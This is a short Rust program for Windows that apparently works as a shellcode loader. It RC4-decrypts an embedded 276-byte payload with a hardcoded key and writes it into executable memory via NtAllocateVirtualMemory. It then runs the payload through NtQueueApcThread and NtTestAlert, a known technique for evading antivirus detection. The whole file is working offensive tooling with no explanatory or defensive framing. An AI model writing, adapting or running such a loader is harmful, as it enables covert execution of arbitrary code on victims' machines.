#![cfg(windows)]
extern crate crypto;

use crypto::symmetriccipher::SynchronousStreamCipher;
use ntapi::ntmmapi::{NtAllocateVirtualMemory,NtWriteVirtualMemory};
use ntapi::ntpsapi::{NtCurrentProcess,NtCurrentThread,NtQueueApcThread,NtTestAlert,PPS_APC_ROUTINE};
use std::ptr::null_mut;
use ntapi::winapi::ctypes::c_void;

fn main() {
    let test : [u8;276] = 
    [0x76, 0xc2, 0xd1, 0x96, 0xf1, 0x2a, 0x8a, 0xb9, 0xb6, 0xa0, 0x1d, 0x88, 0xb6, 0xde, 0xab, 0x36, 0x9a, 0x5f, 0x68, 0x35, 0x99, 0x91, 0x2e, 0x3a, 0x72, 0x57, 0xaa, 0x8f, 0xce, 0x9d, 0xea, 0xc6, 0x80, 0xe6, 0x43, 0xc7, 0xf3, 0xf2, 0x5b, 0x00, 0x85, 0xa7, 0xc5, 0x23, 0x2f, 0xd9, 0x97, 0xcb, 0x37, 0x9a, 0xe4, 0xf8, 0x5f, 0x55, 0xe5, 0xff, 0x52, 0x0d, 0x59, 0xe5, 0xfe, 0x20, 0x88, 0x6f, 0x1f, 0xd2, 0xf8, 0x94, 0x24, 0x44, 0x0c, 0x5c, 0xd5, 0xb1, 0x57, 0x02, 0xd0, 0x8b, 0xf2, 0x16, 0x3c, 0x28, 0xda, 0xd5, 0x21, 0x35, 0xc2, 0x63, 0x59, 0x43, 0xed, 0xcb, 0x93, 0xd1, 0x35, 0x5b, 0x98, 0x78, 0xd4, 0x28, 0xe7, 0x7d, 0xf3, 0x05, 0xb2, 0xda, 0xaf, 0x95, 0x3c, 0x3a, 0xfb, 0xb6, 0xb7, 0x7a, 0xc8, 0x4e, 0x18, 0xec, 0x28, 0xce, 0x81, 0x5a, 0x32, 0xbc, 0xa5, 0xa0, 0xf9, 0xd1, 0x82, 0xdc, 0xc0, 0x4d, 0xf7, 0x39, 0xf3, 0x3d, 0x05, 0x46, 0x9a, 0xf0, 0xac, 0xa4, 0x88, 0xe8, 0xd4, 0xfe, 0x26, 0xe4, 0xba, 0xb5, 0xf2, 0x81, 0xfe, 0xfc, 0x4d, 0xa0, 0x16, 0xe5, 0xfb, 0xae, 0x84, 0xd0, 0xa9, 0xde, 0xd2, 0x16, 0xb9, 0x4e, 0x5f, 0xe0, 0xf2, 0x1b, 0x10, 0x68, 0x5f, 0x82, 0xab, 0x81, 0x9b, 0xd1, 0xec, 0x2f, 0x50, 0x20, 0x6e, 0x34, 0x2b, 0x01, 0xac, 0xd9, 0x90, 0x75, 0xa3, 0x85, 0x83, 0x8b, 0x5e, 0x46, 0xff, 0xee, 0x28, 0x92, 0x4f, 0xd2, 0xe3, 0x32, 0x58, 0x2e, 0x71, 0xbd, 0x1f, 0x2e, 0xa9, 0xc1, 0x65, 0xe5, 0x3d, 0x48, 0x53, 0xd0, 0xbb, 0x06, 0x90, 0x1f, 0x1e, 0xa1, 0xb9, 0x8c, 0x13, 0x2d, 0x53, 0x36, 0x5a, 0x1f, 0x7a, 0xa8, 0xf9, 0x78, 0xf2, 0x39, 0xa2, 0x10, 0x05, 0x13, 0xae, 0xf6, 0xf1, 0x97, 0xed, 0x81, 0x90, 0xa5, 0xb9, 0x7b, 0x6b, 0x09, 0x36, 0x6f, 0x8a, 0x43, 0x07, 0xe6, 0xa7, 0xa0, 0xc0, 0x46, 0x41, 0xc1, 0xc9, 0xcc, 0x8d, 0x0e, 0x44, 0x0c, 0x6c, 0x1b];

    let mut cipher = crypto::rc4::Rc4::new("I_AM_A_KEY".as_bytes());
    let mut o = test.clone();
    cipher.process(&test[..],  &mut o);
        unsafe {
            let mut allocstart : *mut c_void = null_mut();
            let mut seize : usize = o.len();
            NtAllocateVirtualMemory(NtCurrentProcess,&mut allocstart,0,&mut seize, 0x00003000, 0x40);
            NtWriteVirtualMemory(NtCurrentProcess,allocstart,o.as_ptr() as _,o.len() as usize,null_mut());
            NtQueueApcThread(NtCurrentThread,Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,allocstart,null_mut(),null_mut());
            NtTestAlert();
        }
}